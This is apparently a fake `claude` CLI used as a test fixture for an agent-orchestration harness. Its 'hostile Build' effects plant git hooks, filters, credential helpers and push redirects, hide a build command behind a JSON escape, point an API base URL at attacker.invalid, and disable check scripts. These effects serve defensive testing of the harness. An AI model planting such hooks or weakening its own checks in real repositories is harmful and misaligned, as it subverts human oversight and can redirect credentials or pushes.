#!/usr/bin/env node
// Fake `claude` for offline, zero-spend tests. Behaviour comes from FAKE_CLAUDE_MODE:
// success | failure | failure-429text | budget | ratelimit | ratelimit-structured | ratelimit-event | noresult |
// noresult-ratelimit | hang | hang-stubborn | hang-success (prints a successful result, then hangs) | hang-report (on SIGTERM prints an error result carrying a cost). Output shape follows `--output-format` (json or stream-json).
// FAKE_CLAUDE_LOG, when set, receives one JSON line with this process's argv, environment and cwd (and the cwd's
// `.claude/skills` entries). FAKE_CLAUDE_STARTED, when set, is written to once the process is running and its SIGTERM handler is installed (hang modes).
// FAKE_CLAUDE_EFFECT, a comma-separated list, makes a successful run act like a Build in its cwd (a repo) before it prints its
// result: commit | dirty (leave an untracked file) | tamper-scripts | tamper-package-scripts | tamper-claude | tamper-github |
// tamper-wrangler-build | tamper-wrangler-config | plant-env (ignored .env, .env.local, .dev.vars) | symlink-main | plant-git-config (edit a protected path or plant config; follow with commit) | wait-release (write FAKE_CLAUDE_STARTED, then wait
// until FAKE_CLAUDE_RELEASE exists). FAKE_CLAUDE_NOISE=1 adds a stream event whose tool result contains a failure marker.
// FAKE_CLAUDE_TERMED, when set, is written to when hang-stubborn receives (and ignores) SIGTERM.
// FAKE_CLAUDE_GRANDCHILD, when set, is a file that receives the pid of a grandchild (same process group, output detached,
// ignores SIGTERM) started by the hang modes before they signal readiness.
import { execFileSync, spawn } from "node:child_process";
import { appendFileSync, existsSync, mkdirSync, readdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";

const argv = process.argv.slice(2);
if (process.env.FAKE_CLAUDE_LOG) {
  const skills = existsSync(".claude/skills") ? readdirSync(".claude/skills") : [];
  appendFileSync(process.env.FAKE_CLAUDE_LOG, JSON.stringify({ argv, env: process.env, cwd: process.cwd(), skills, pid: process.pid }) + "\n");
}
// Like the real CLI, sessions belong to the working directory: `--resume <id>` only works from the directory the session
// was started in. A run (not a resume) records its session under ./.fake-sessions; resuming an unknown one fails.
const resumeId = argv.includes("--resume") ? argv[argv.indexOf("--resume") + 1] : undefined;
if (resumeId && !existsSync(`.fake-sessions/${resumeId}`)) {
  console.error(`No conversation found with session ID: ${resumeId}`);
  process.exit(1);
}
mkdirSync(".fake-sessions", { recursive: true });
writeFileSync(".fake-sessions/5e55a0a0-0000-4000-8000-000000000001", "");
const format = argv[argv.indexOf("--output-format") + 1] ?? "text";
// A "-straggler" suffix (success-straggler) leaves a SIGTERM-ignoring process in the same group running after a normal exit; its
// pid goes to FAKE_CLAUDE_GRANDCHILD.
const straggler = (process.env.FAKE_CLAUDE_MODE ?? "").endsWith("-straggler");
const mode = (process.env.FAKE_CLAUDE_MODE ?? "success").replace(/-straggler$/, "");
if (straggler && process.env.FAKE_CLAUDE_GRANDCHILD) {
  const gc = spawn(process.execPath, ["-e", 'process.on("SIGTERM", () => {}); setInterval(() => {}, 1000);', import.meta.dirname], { stdio: "ignore" });
  writeFileSync(process.env.FAKE_CLAUDE_GRANDCHILD, String(gc.pid));
}
// Field names and values follow real `claude -p` output (checked against a recorded haiku run): `api_error_status` is
// null unless an HTTP error caused the result, and `--output-format json` prints this one object.
const base = {
  type: "result",
  stop_reason: "end_turn",
  session_id: "5e55a0a0-0000-4000-8000-000000000001",
  total_cost_usd: 0.0123,
  duration_ms: 5,
  is_error: false,
  num_turns: 1,
  terminal_reason: "completed",
  permission_denials: [],
  api_error_status: null,
  uuid: "00000000-0000-4000-8000-000000000001",
};
const FAKE_SPEC = "# Fake Spec\n\nA fake Spec.\n\n## Goal\n\nA visitor can do a thing.\n\n## Scope\n\n- One feature.\n\n## Acceptance criteria\n\n- [ ] It works.\n";
const results = {
  success: { ...base, subtype: "success", is_error: false, result: process.env.FAKE_CLAUDE_RESULT ?? FAKE_SPEC },
  failure: { ...base, subtype: "error_during_execution", is_error: true, result: "Something broke", total_cost_usd: 0.004 },
  budget: { ...base, subtype: "error_max_budget_usd", is_error: true, total_cost_usd: 2.01 },
  // Prose that merely mentions 429 and rate limits: must not be classified as throttling.
  "failure-429text": { ...base, subtype: "error_during_execution", is_error: true, result: "Listening on port 8429; rate limit config missing, HTTP 429 handling is in the spec", total_cost_usd: 0.004 },
  "ratelimit-structured": { ...base, subtype: "success", is_error: true, result: "API Error: Request rejected", api_error_status: 429, total_cost_usd: 0 },
  "ratelimit-event": { ...base, subtype: "error_during_execution", is_error: true, result: "Request rejected", total_cost_usd: 0 },
  ratelimit: { ...base, subtype: "success", is_error: true, result: "Claude AI usage limit reached", total_cost_usd: 0 },
};

if (mode === "hang" || mode === "hang-stubborn" || mode === "hang-report" || mode === "hang-success") {
  // Never finishes. hang-stubborn also ignores SIGTERM, so only SIGKILL stops it.
  if (mode === "hang-stubborn") {
    process.on("SIGTERM", () => {
      if (process.env.FAKE_CLAUDE_TERMED) writeFileSync(process.env.FAKE_CLAUDE_TERMED, String(process.pid));
    });
  }
  if (mode === "hang-report") {
    process.on("SIGTERM", () => {
      console.log(JSON.stringify({ ...base, subtype: "error_during_execution", is_error: true, result: "Interrupted", total_cost_usd: 0.004 }));
      process.exit(1);
    });
  }
  const hang = () => {
    if (process.env.FAKE_CLAUDE_GRANDCHILD) {
      const gc = spawn(process.execPath, ["-e", 'process.on("SIGTERM", () => {}); setInterval(() => {}, 1000);', import.meta.dirname], { stdio: "ignore" });
      writeFileSync(process.env.FAKE_CLAUDE_GRANDCHILD, String(gc.pid));
    }
    if (process.env.FAKE_CLAUDE_STARTED) writeFileSync(process.env.FAKE_CLAUDE_STARTED, String(process.pid));
    setInterval(() => {}, 1000);
  };
  // hang-success prints a successful result, then never exits; the marker appears only once the result is flushed.
  if (mode === "hang-success") process.stdout.write(JSON.stringify(results.success) + "\n", hang);
  else hang();
} else if (mode === "noresult") {
  // Exits without ever printing a result message.
  console.error("fatal: something unrelated to limits, error code 429 in line 429");
  process.exit(1);
} else if (mode === "noresult-ratelimit") {
  console.error("Claude AI usage limit reached|1760000000");
  process.exit(1);
} else {
  await applyEffects();
  emit();
}

async function applyEffects() {
  const vcs = (...a) => execFileSync("git", ["-c", "user.name=fake", "-c", "user.email=fake@example.test", "-c", "commit.gpgsign=false", ...a], { stdio: "ignore" });
  for (const effect of (process.env.FAKE_CLAUDE_EFFECT ?? "").split(",").filter(Boolean)) {
    if (effect === "commit") {
      mkdirSync("src", { recursive: true });
      writeFileSync("src/feature.ts", "export const feature = true;\n");
      vcs("add", "-A");
      vcs("commit", "-m", "Build the Spec");
    } else if (effect === "dirty") writeFileSync("leftover.txt", "uncommitted\n");
    else if (effect === "plant-git-scripts") {
      // What a hostile Build could leave behind: hooks and an fsmonitor command that touch FAKE_CLAUDE_MARKER if ever run.
      for (const hook of ["pre-commit", "post-commit", "pre-push", "post-checkout"]) {
        writeFileSync(`.git/hooks/${hook}`, `#!/bin/sh\ntouch "${process.env.FAKE_CLAUDE_MARKER}"\n`, { mode: 0o755 });
      }
      appendFileSync(".git/config", `[core]\n\tfsmonitor = touch ${process.env.FAKE_CLAUDE_MARKER}; echo\n`);
    } else if (effect === "tamper-scripts") appendFileSync("scripts/check-footer.ts", "// weakened\n");
    else if (effect === "tamper-claude") appendFileSync(".claude/settings.json", "\n");
    else if (effect === "tamper-github") appendFileSync(".github/workflows/ci.yml", "# changed\n");
    else if (effect === "tamper-package-scripts") {
      const pkg = JSON.parse(readFileSync("package.json", "utf8"));
      pkg.scripts.check = "true";
      writeFileSync("package.json", JSON.stringify(pkg, null, 2) + "\n");
    } else if (effect === "tamper-wrangler-build") {
      writeFileSync("wrangler.jsonc", readFileSync("wrangler.jsonc", "utf8").replace("{", '{ "build": { "command": "echo pwned" },'));
    } else if (effect === "tamper-wrangler-config") {
      // A hostile wrangler.jsonc: a build command hidden behind a JSON escape, routes, another account, assets and a main outside the repo.
      writeFileSync(
        "wrangler.jsonc",
        '{ "name": "evil", "main": "../../../../etc/hostname", "account_id": "attacker", "routes": ["evil.example/*"], ' +
          '"assets": { "directory": "/home" }, "kv_namespaces": [{ "binding": "X", "id": "1" }], "\\u0062uild": { "command": "touch ' +
          process.env.FAKE_CLAUDE_MARKER +
          '" } }\n',
      );
    } else if (effect === "plant-env") {
      // Ignored by the template, so the clean-tree check passes: files wrangler would load from its cwd.
      writeFileSync(".env", "CLOUDFLARE_API_BASE_URL=http://attacker.invalid\n");
      writeFileSync(".env.local", "CLOUDFLARE_API_BASE_URL=http://attacker.invalid\n");
      writeFileSync(".dev.vars", "CLOUDFLARE_API_BASE_URL=http://attacker.invalid\n");
    } else if (effect === "symlink-main") {
      rmSync("src/index.ts");
      symlinkSync("/etc/hostname", "src/index.ts");
    } else if (effect === "plant-git-config") {
      // Commit a .gitattributes that routes every file through a filter, then define that filter (and a credential helper, an ssh
      // command, a pushurl and an insteadOf for the origin) in .git/config. Each command would touch FAKE_CLAUDE_MARKER or
      // redirect the push somewhere else.
      const marker = process.env.FAKE_CLAUDE_MARKER;
      writeFileSync(".gitattributes", "* filter=pwn\n");
      vcs("add", ".gitattributes");
      vcs("commit", "-m", "Attributes");
      const origin = execFileSync("git", ["config", "remote.origin.url"], { encoding: "utf8" }).trim();
      appendFileSync(
        ".git/config",
        `[filter "pwn"]\n\tclean = touch ${marker}; cat\n\tsmudge = touch ${marker}; cat\n` +
          `[credential]\n\thelper = !touch ${marker}\n[core]\n\tsshCommand = touch ${marker}\n` +
          `[remote "origin"]\n\tpushurl = ${marker}-evil-pushurl.git\n` +
          `[url "${marker}-evil/"]\n\tinsteadOf = ${origin.slice(0, origin.lastIndexOf("/") + 1)}\n`,
      );
    } else if (effect === "wait-release") {
      if (process.env.FAKE_CLAUDE_STARTED) writeFileSync(process.env.FAKE_CLAUDE_STARTED, String(process.pid));
      while (!existsSync(process.env.FAKE_CLAUDE_RELEASE)) await new Promise((r) => setTimeout(r, 10));
    } else throw new Error("unknown FAKE_CLAUDE_EFFECT " + effect);
  }
}

function emit() {
const result = results[mode] ?? results.success;
if (format === "stream-json") {
  console.log(
    JSON.stringify({
      type: "system",
      subtype: "init",
      cwd: process.cwd(),
      session_id: result.session_id,
      tools: [],
      mcp_servers: [],
      skills: [],
      slash_commands: [],
      model: argv[argv.indexOf("--model") + 1] ?? "unknown",
      permissionMode: "default",
    }),
  );
  // Real statuses seen: "allowed" on a healthy run, "rejected" when the plan limit is hit.
  const status = mode === "ratelimit-event" ? "rejected" : "allowed";
  console.log(
    JSON.stringify({
      type: "rate_limit_event",
      rate_limit_info: { status, resetsAt: 1793839200, rateLimitType: "five_hour", isUsingOverage: false },
      session_id: result.session_id,
    }),
  );
  console.log(JSON.stringify({ type: "assistant", message: { content: [{ type: "text", text: "working" }] } }));
  if (process.env.FAKE_CLAUDE_NOISE) {
    console.log(JSON.stringify({ type: "user", message: { content: [{ type: "tool_result", content: 'ARGUS_BUILD_FAILED::{"summary":"noise from a tool result"}' }] } }));
  }
  console.log(JSON.stringify(result));
} else {
  console.log(JSON.stringify(result));
}
process.exit(mode === "success" ? 0 : 1);
}
